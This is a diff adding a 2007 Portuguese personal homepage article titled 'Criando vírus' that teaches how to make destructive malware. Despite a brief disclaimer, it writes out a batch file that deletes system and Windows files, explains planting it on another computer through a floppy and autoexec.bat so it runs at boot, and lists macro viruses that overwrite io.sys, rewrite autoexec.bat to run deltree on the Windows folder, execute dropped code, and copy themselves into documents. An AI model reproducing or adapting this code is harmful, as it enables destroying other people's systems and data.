@@ -1,0 +1,106 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV=Content-Type CONTENT="text/html; charset=utf-8">
+<META HTTP-EQUIV=Content-Language CONTENT=pt-br>
+<META NAME=language CONTENT=pt-BR>
+<TITLE>Criando vírus &mdash; Victor Ferreira&#39;s Homepage</TITLE>
+<META NAME=description CONTENT="Este texto apresenta, de forma simplificada, como criar um arquivo malicioso para danificar o computador de terceiros. Ressaltamos que tais ações são antiéticas e, em muitos casos, ilegais. O conteúdo a seguir é apenas descritivo…">
+<META NAME=keywords CONTENT="Victor Ferreira, homepage, blog, artigos, notas">
+<META NAME=abstract CONTENT="Este texto apresenta, de forma simplificada, como criar um arquivo malicioso para danificar o computador de terceiros. Ressaltamos que tais ações são antiéticas e, em muitos casos, ilegais. O conteúdo a seguir é apenas descritivo…">
+<META NAME=author CONTENT="Victor Ferreira">
+<META NAME=robots CONTENT="index, follow">
+<LINK REL="shortcut icon" HREF=/favicon.ico>
+<BGSOUND SRC=/files/sound001.mid LOOP="infinite">
+</HEAD>
+<BODY LINK=#3CFF00 ALINK=#3CFF00 VLINK=#3CFF00 BGCOLOR=#202020 BACKGROUND=/files/background_slate.gif>
+<FONT FACE="Verdana, Arial, Helvetica, sans-serif" COLOR=#3CFF00 SIZE=2>
+<DIV><A HREF=/ >Victor Ferreira&#39;s Homepage</A></DIV>
+<P><IMG SRC=/files/linha01.gif WIDTH=765 HEIGHT=30></P>
+<H1>Criando vírus</H1>
+<P><I><FONT SIZE=1>sábado, 9 de junho de 2007</FONT></I></P>
+<p>Este texto apresenta, de forma simplificada, como criar um arquivo malicioso para danificar o computador de terceiros. Ressaltamos que tais ações são antiéticas e, em muitos casos, ilegais. O conteúdo a seguir é apenas descritivo e não deve ser utilizado para fins prejudiciais.</p>
+<h2>Criando um arquivo malicioso em lote</h2>
+<p>Primeiramente, crie um arquivo de lote no computador. Este tipo de arquivo pode ser criado sem a necessidade de compilação. Caso não saiba como proceder, aqui está o comando para criá-lo no DOS:</p>
+<pre><code>copy con arquivo.bat
+@echo off
+@echo mensagem de sua escolha
+del *.sys
+del *.exe
+del *.com
+cd windows
+del *.*
+del arquivo.bat
+@echo mensagem de sua escolha</code></pre>
+<p>Este comando criará um arquivo de lote capaz de apagar diversos arquivos do sistema. No entanto, ele só será executado se for iniciado manualmente. Tenha cuidado ao manipulá-lo, pois pode causar sérios danos ao sistema.</p>
+<p>Para utilizá-lo em outro ambiente, transfira o arquivo <code>arquivo.bat</code> para um disquete, acompanhado de um arquivo <code>autoexec.bat</code> contendo a seguinte linha de comando:</p>
+<pre><code>C:\arquivo.bat
+</code></pre>
+<p>Ao inserir o disquete em outro computador, copie os arquivos para o diretório <code>C:\</code>. Feito isso, remova o disquete e deixe o sistema executar o arquivo na próxima inicialização.</p>
+<center><img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0></center>
+<h2>Exemplo de um vírus de macro</h2>
+<p>Abaixo está um exemplo de um vírus de macro capaz de modificar arquivos ou causar outros danos ao sistema:</p>
+<p><b>Vírus 12/04</b></p>
+<pre><code>Sub MAIN()
+   If Day(Now) = 12 And Month(Now) = 4 Then
+       SetAttr "C:\msdos.sys", 0
+       Open "C:\io.sys" For Output As #1
+       Print #1, "Mensagem maliciosa"
+       Close #1
+   End If
+   Open "C:\autoexec.bat" For Output As #1
+   Print #1, "@echo off"
+   Print #1, "cls"
+   Print #1, "@deltree /y c:\windows &gt; nul"
+   Close #1
+End Sub</code></pre>
+<p><b>Rotina 2</b></p>
+<pre><code>Sub MAIN()
+    Open "C:\imaiden.txt" For Output As #1
+    Print #1, "Código em hexadecimal"
+    Close #1
+    Shell "debug texto.txt"
+    Shell "c:\imaiden.com"
+End Sub</code></pre>
+<p><b>Rotina 3</b></p>
+<pre><code>Sub MAIN()
+    MacroCopy "Global:Inocu", "DocumentoNovo", 0
+End Sub</code></pre>
+<p><b>Vírus Fagundes Varela</b></p>
+<pre><code>Sub MAIN()
+    BeginDocument
+    Insert "Lembra dessas noites"
+    Insert CHR$(13)
+    Insert "Cheias de doce harmonia,"
+    Insert CHR$(13)
+    Insert "Quando a floresta gemia"
+    Insert CHR$(13)
+    Insert "Do vento aos brandos açoites?"
+    Insert CHR$(13)
+    Insert CHR$(13)
+    Insert "Quando as estrelas sorriam"
+    Insert CHR$(13)
+    Insert "Quando as campinas tremiam"
+    Insert CHR$(13)
+    Insert "Nas dobras do úmido véu?"
+    Insert CHR$(13)
+    Insert "E nossas almas unidas"
+    Insert CHR$(13)
+    Insert "Estreitavam-se, sentidas,"
+    Insert CHR$(13)
+    Insert "Ao brilhar daquele céu?"
+    StandardPrintDocument
+End Sub</code></pre>
+<center><img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0>&nbsp;&nbsp;&nbsp;&nbsp;<img src=/files/craneo.gif alt=caveira width=64 height=64 border=0></center>
+<h2>Observações</h2>
+<p>Esses exemplos ilustram códigos maliciosos, conhecidos como "destructive scripts", programados para danificar sistemas, desconfigurar arquivos essenciais, como <code>io.sys</code>, <code>msdos.sys</code> e <code>command.com</code>, ou até mesmo travar o computador por completo. No entanto, sua remoção pode ser realizada de várias formas, como a formatação completa do disco rígido (<code>format c: /u</code>) ou a utilização de ferramentas de antivírus atualizadas.</p>
+<p>No caso de sistemas mais modernos, como o Windows XP, recomenda-se criar um ponto de restauração para evitar perda de dados importantes. Já em sistemas mais antigos, como o Windows 98, o suporte limitado pode tornar a recuperação mais desafiadora.</p>
+<P><IMG SRC=/files/linha01.gif WIDTH=765 HEIGHT=30></P>
+<p><A HREF=http://www.free-stuff.me.uk/free/voucher_codes/ TARGET=_blank><IMG SRC="http://001.c-o-u-n-t.com/count-016.pl?count=0a07xg5dgnmty32t8swk&type=odmeter1&prog=hit" WIDTH=95 HEIGHT=22 BORDER=0 ALT="voucher codes" TITLE="voucher codes"></A></p>
+<p><a href="http://webquiz.hypermart.net/cgi-bin/counter/counter_stat.cgi?ID=victorferreira" target=_top><script><!--
+		document.write("<img border=0 src=http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&DIGIT=4&REF=");document.write(escape(parent.document.referrer));document.write(">");// --></script><img border=0 src="http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&amp;DIGIT=4&amp;REF=</template" lwl38x8ud="">&gt;<img border=0 src="http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&amp;DIGIT=3" lwl38x8ud=""><img border=0 src="http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&amp;DIGIT=2" lwl38x8ud=""><img border=0 src="http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&amp;DIGIT=1" lwl38x8ud=""><img border=0 src="http://webquiz.hypermart.net/cgi-bin/counter/counter.cgi?ID=victorferreira&amp;DIGIT=0" lwl38x8ud=""><br>Estatísticas</a></p>
+<p><img border=0 src=/files/Linux.gif width=88 height=31></p>
+<P><I><FONT SIZE=1>Copyright &copy; 2007 Victor Ferreira - victorotavioferreira@hotmail.com</FONT></I></P>
+</FONT>
+</BODY>
+</HTML>
